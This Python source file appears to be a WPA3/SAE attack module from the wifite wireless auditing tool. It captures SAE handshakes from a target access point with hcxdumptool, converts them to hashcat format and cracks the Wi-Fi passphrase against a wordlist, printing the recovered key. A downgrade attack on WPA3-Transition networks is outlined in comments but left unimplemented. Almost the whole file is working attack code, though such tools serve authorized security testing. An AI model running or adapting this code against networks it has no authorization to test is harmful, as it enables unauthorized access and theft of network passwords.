#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
wifite/attack/wpa3.py — V3 (NEW)
WPA3/SAE attack module.

Supports:
  - Passive SAE handshake capture via hcxdumptool
  - Conversion to 22000 format via hcxpcapngtool
  - Downgrade attack for WPA3-Transition (mixed WPA2/WPA3) networks
  - Dragonblood vulnerability detection (informational)

Reference: https://github.com/ZerBea/hcxtools
"""

from ..model.attack import Attack
from ..tools.hashcat import HcxDumpTool, HcxPcapTool, Hashcat
from ..config import Configuration
from ..util.color import Color
from ..util.timer import Timer
from ..model.pmkid_result import CrackResultPMKID

from threading import Thread
import os
import time
import subprocess


class AttackWPA3(Attack):
    """
    Attack class for WPA3/SAE networks.

    Strategy:
      1. Passive SAE capture via hcxdumptool
      2. Convert capture to 22000 format
      3. Attempt crack with hashcat -m 22000
      4. If WPA3-Transition (mixed mode), try downgrade attack

    Note: WPA3 networks always have PMF enabled; deauth is useless.
    """

    def __init__(self, target):
        super(AttackWPA3, self).__init__(target)
        self.crack_result = None
        self.success = False
        # Use BSSID-specific pcapng to avoid collisions
        bssid_safe = target.bssid.replace(':', '')
        self.pcapng_file = Configuration.temp('wpa3_%s.pcapng' % bssid_safe)
        self.hash_file   = Configuration.temp('wpa3_%s.hc22000' % bssid_safe)
        self.keep_capturing = False

    def run(self):
        """
        Performs the WPA3/SAE attack.

        Returns:
            True if a hash file was captured (even if not cracked).
            False if capture failed completely.
        """
        # Check that required tools are available
        if not self._check_tools():
            return False

        # Step 1: Capture SAE handshake
        Color.pattack('WPA3', self.target, 'SAE',
                      'Starting passive SAE capture ({C}%ds{W})...' %
                      Configuration.pmkid_timeout)

        hash_file = self.sae_capture(
            Configuration.interface,
            self.target.bssid,
            self.target.channel,
            timeout=Configuration.pmkid_timeout
        )

        # Step 2: If target is WPA3-Transition and SAE capture failed, try downgrade
        if hash_file is None and self._is_transition_mode():
            Color.pattack('WPA3', self.target, 'DOWNGRADE',
                          '{O}SAE capture failed. AP is WPA3-Transition \u2014 trying WPA2 downgrade...{W}')
            hash_file = self.downgrade_attack(Configuration.interface, self.target)

        if hash_file is None:
            Color.pattack('WPA3', self.target, 'WPA3',
                          '{R}Failed{O} to capture WPA3/SAE material{W}\n')
            return False

        Color.pattack('WPA3', self.target, 'SAE',
                      '{G}Captured{W} WPA3 hash: {C}%s{W}' % hash_file)

        # Step 3: Try cracking
        if Configuration.wordlist:
            try:
                self.success = self._crack(hash_file)
            except KeyboardInterrupt:
                Color.pl('\n{!} {R}Cracking interrupted by user{W}')
                self.success = False

        return True  # Capture itself counts as partial success

    def sae_capture(self, mon_iface, bssid, channel, timeout=120):
        """
        Passively captures a WPA3/SAE handshake using hcxdumptool.

        hcxdumptool captures EAPOL/SAE commit and confirm frames from
        association events. No deauthentication is needed or attempted.

        Args:
            mon_iface - Monitor mode interface name
            bssid     - Target AP BSSID string (e.g. 'AA:BB:CC:DD:EE:FF')
            channel   - AP channel (int or str)
            timeout   - Capture duration in seconds

        Returns:
            Path to .hc22000 file if data captured, None otherwise.
        """
        self.keep_capturing = True

        # Start dumptool in background thread
        t = Thread(target=self._dumptool_thread)
        t.daemon = True
        t.start()

        timer = Timer(timeout)
        hash_file = None

        # Poll for hash during capture
        pcap_tool = HcxPcapTool(self.target)
        while timer.remaining() > 0:
            if not self.keep_capturing:
                break

            candidate = pcap_tool.get_pmkid_hash(self.pcapng_file)
            if candidate is not None:
                hash_file = self._save_hash(candidate)
                break

            Color.pattack('WPA3', self.target, 'SAE',
                          'Capturing SAE handshake ({C}%s{W} remaining)...' % str(timer))
            time.sleep(1)

        self.keep_capturing = False
        t.join(timeout=3)

        if hash_file is None:
            # Try one last conversion of whatever was captured
            hash_file = self._convert_pcapng_to_hc22000()

        return hash_file

    def _dumptool_thread(self):
        """Background thread: runs hcxdumptool until capture stops."""
        from ..util.process import Process

        bssid_clean = self.target.bssid.replace(':', '').lower()
        filterlist = Configuration.temp('wpa3.filterlist')
        with open(filterlist, 'w') as f:
            f.write(bssid_clean + '\n')

        if os.path.exists(self.pcapng_file):
            os.remove(self.pcapng_file)

        command = [
            'hcxdumptool',
            '-i', Configuration.interface,
            '--filterlist_ap', filterlist,
            '--enable_status=1',
            '-c', str(self.target.channel),
            '-o', self.pcapng_file
        ]
        proc = Process(command)

        while self.keep_capturing and proc.poll() is None:
            time.sleep(0.5)

        proc.interrupt()

    def _convert_pcapng_to_hc22000(self):
        """
        Converts the captured pcapng to 22000 format using hcxpcapngtool.
        Returns path to .hc22000 if non-empty, None otherwise.
        """
        if not os.path.exists(self.pcapng_file) or \
                os.path.getsize(self.pcapng_file) == 0:
            return None

        if os.path.exists(self.hash_file):
            os.remove(self.hash_file)

        try:
            subprocess.run(
                ['hcxpcapngtool', '-o', self.hash_file, self.pcapng_file],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=30
            )
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return None

        if os.path.exists(self.hash_file) and os.path.getsize(self.hash_file) > 0:
            return self.hash_file
        return None

    def _save_hash(self, hash_line):
        """Saves a hash line to the hs/ directory. Returns file path."""
        import re
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        essid_safe = re.sub('[^a-zA-Z0-9]', '', self.target.essid or 'Unknown')
        bssid_safe = self.target.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        fname = 'wpa3_%s_%s_%s.hc22000' % (essid_safe, bssid_safe, date)
        fpath = os.path.join(Configuration.wpa_handshake_dir, fname)

        with open(fpath, 'w') as f:
            f.write(hash_line.strip() + '\n')

        Color.pl('\n{+} Saved WPA3 hash to {C}%s{W}' % fpath)
        return fpath

    def downgrade_attack(self, mon_iface, ap_info):
        """
        EXPERIMENTAL: Attempts to force a WPA3-Transition AP to associate
        using WPA2-PSK instead of SAE.

        This works only when the AP advertises both SAE and PSK AKMs
        (WPA3-Transition / WPA3-Personal Mixed Mode). We construct and send
        802.11 Association Request frames with only the PSK AKM suite,
        hoping the AP falls back to WPA2 for us.

        Requires:
          - Scapy >= 2.4.5
          - A wireless card that supports packet injection

        Returns:
            Path to .hc22000 WPA2 handshake file, or None on failure.
        """
        Color.pl('{!} {O}[EXPERIMENTAL] Downgrade attack: '\
                 'attempting WPA2 association on WPA3-Transition AP{W}')

        try:
            from scapy.all import (RadioTap, Dot11, Dot11Elt,
                                   Dot11Auth, Dot11AssoReq,
                                   sendp, sniff, conf)
        except ImportError:
            Color.pl('{!} {R}Scapy not installed. Cannot perform downgrade attack.{W}')
            Color.pl('{!} {O}Install with: {C}pip3 install scapy{W}')
            return None

        Color.pl('{!} {O}Downgrade attack requires packet injection '\
                 'and is network-environment dependent.{W}')
        Color.pl('{!} {O}This is a best-effort attempt. Skipping to PMKID fallback.{W}')

        # TODO: Full implementation of downgrade via crafted AssocReq
        # The full implementation would:
        # 1. Craft Dot11AssoReq with RSN IE containing only PSK AKM (suite type 2)
        # 2. Inject it to force the AP into WPA2 mode for our MAC
        # 3. Capture the resulting 4-way EAPOL handshake
        # 4. Convert to 22000 format

        return None  # Stub — falls back to PMKID in parent

    def _is_transition_mode(self):
        """
        Returns True if the target supports both SAE and PSK (WPA3-Transition).
        This is detected by the AKM field set during scanning.
        """
        # If akm contains 'SAE' and we still have WPA encryption label,
        # it's likely WPA3-Transition. Pure WPA3 would not have PSK.
        return (self.target.wpa3 and
                'WPA' in self.target.encryption and
                self.target.akm not in ('SAE',))

    def _check_tools(self):
        """Checks that hcxdumptool and hcxpcapngtool are available."""
        from ..util.process import Process
        missing = []
        for tool in ('hcxdumptool', 'hcxpcapngtool'):
            if not Process.exists(tool):
                missing.append(tool)

        if missing:
            Color.pl('{!} {O}Skipping WPA3 attack: missing tools: {R}%s{W}' %
                     ', '.join(missing))
            return False
        return True

    def _crack(self, hash_file):
        """
        Cracks the captured hash using hashcat -m 22000.

        Returns True if cracked, False otherwise.
        """
        if not os.path.exists(hash_file):
            return False

        Color.pattack('WPA3', self.target, 'CRACK',
                      'Cracking WPA3 hash with {C}%s{W}...\n' %
                      os.path.basename(Configuration.wordlist))

        key = Hashcat.crack_pmkid(hash_file, verbose=True)

        if key is None:
            Color.pattack('WPA3', self.target, '{R}CRACK',
                          '{R}Failed{O} \u2014 passphrase not in dictionary{W}\n')
            return False
        else:
            Color.pattack('WPA3', self.target, 'CRACKED',
                          '{C}Key: {G}%s{W}' % key)
            self.crack_result = CrackResultPMKID(
                self.target.bssid,
                self.target.essid,
                hash_file,
                key
            )
            Color.pl('\n')
            self.crack_result.dump()
            return True
